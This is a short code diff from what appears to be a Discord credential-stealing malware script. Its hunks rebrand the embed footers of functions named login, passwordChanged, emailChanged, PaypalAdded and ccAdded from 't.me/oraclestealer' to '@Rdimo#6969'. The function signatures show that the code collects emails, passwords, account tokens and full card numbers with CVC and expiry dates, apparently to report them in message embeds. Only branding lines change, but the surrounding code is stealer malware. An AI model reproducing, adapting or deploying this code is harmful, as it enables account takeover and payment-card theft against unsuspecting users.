@@ -368,7 +368,7 @@ const login = async (email, password, token) => {
               url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
             },
             footer: {
-              text: "t.me/oraclestealer",
+              text: "@Rdimo#6969",
         },
       },
     ],
@@ -438,7 +438,7 @@ const passwordChanged = async (oldpassword, newpassword, token) => {
               url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
             },
             footer: {
-              text: "t.me/oraclestealer",
+              text: "@Rdimo#6969",
         },
       },
     ],
@@ -503,7 +503,7 @@ const emailChanged = async (email, password, token) => {
               url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
             },
             footer: {
-              text: "t.me/oraclestealer",
+              text: "@Rdimo#6969",
         },
       },
     ],
@@ -568,7 +568,7 @@ const PaypalAdded = async (token) => {
               url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
             },
             footer: {
-              text: "t.me/oraclestealer",
+              text: "@Rdimo#6969",
         },
       },
     ],
@@ -633,7 +633,7 @@ const ccAdded = async (number, cvc, expir_month, expir_year, email, password, to
               url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
             },
             footer: {
-              text: "t.me/oraclestealer",
+              text: "@Rdimo#6969",
         },
       },
     ],
